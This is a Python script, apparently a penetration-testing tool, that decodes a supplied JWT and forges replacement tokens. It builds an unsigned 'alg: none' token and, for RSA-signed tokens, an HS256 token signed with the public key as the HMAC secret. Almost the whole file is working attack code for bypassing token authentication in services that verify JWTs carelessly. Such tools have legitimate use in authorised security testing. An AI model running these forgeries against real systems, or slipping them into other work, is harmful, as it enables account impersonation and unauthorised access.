import jwt
import base64
import json
import sys

def b64url_decode(data):
    padding = '=' * (-len(data) % 4)
    return base64.urlsafe_b64decode(data + padding)

def b64url_encode(data: bytes):
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

def decode_jwt(token):
    header_b64, payload_b64, sig = token.split(".")
    header = json.loads(b64url_decode(header_b64))
    payload = json.loads(b64url_decode(payload_b64))
    return header, payload

def alg_none(payload):
    header = {"alg": "none", "typ": "JWT"}
    token = (
        b64url_encode(json.dumps(header).encode()) + "." +
        b64url_encode(json.dumps(payload).encode()) + "."
    )
    return token

def alg_confusion_hs256(payload, public_key_pem: bytes):
    return jwt.encode(
        payload,
        public_key_pem,
        algorithm="HS256"
    )

def read_multiline_input(prompt):
    print(prompt)
    print("(Paste key, then press ENTER twice)")
    lines = []
    while True:
        line = input()
        if line == "":
            break
        lines.append(line)
    return ("\n".join(lines) + "\n").encode()

def main():
    if len(sys.argv) != 2:
        print("Usage:")
        print("  python jwt_pentest.py <JWT>")
        sys.exit(1)

    token = sys.argv[1]

    header, payload = decode_jwt(token)

    print("\n[+] JWT Header:")
    print(json.dumps(header, indent=2))

    print("\n[+] JWT Payload:")
    print(json.dumps(payload, indent=2))

    print("\n[+] Pentest Suggestions:")

    # alg none
    print("\n--- alg: none ---")
    print(alg_none(payload))

    # alg confusion
    alg = header.get("alg", "")
    if alg.startswith("RS"):
        print("\n--- alg confusion (RS â†’ HS256) ---")

        try:
            pubkey = read_multiline_input(
                "[?] Drop RSA PUBLIC key (PEM format):"
            )
            forged = alg_confusion_hs256(payload, pubkey)
            print("\n[+] Forged HS256 token (using public key as HMAC secret):")
            print(forged)
        except Exception as e:
            print("[!] Failed to forge token:", e)
    else:
        print("\n[-] Token is not RS-based, alg confusion not applicable")

if __name__ == "__main__":
    main()
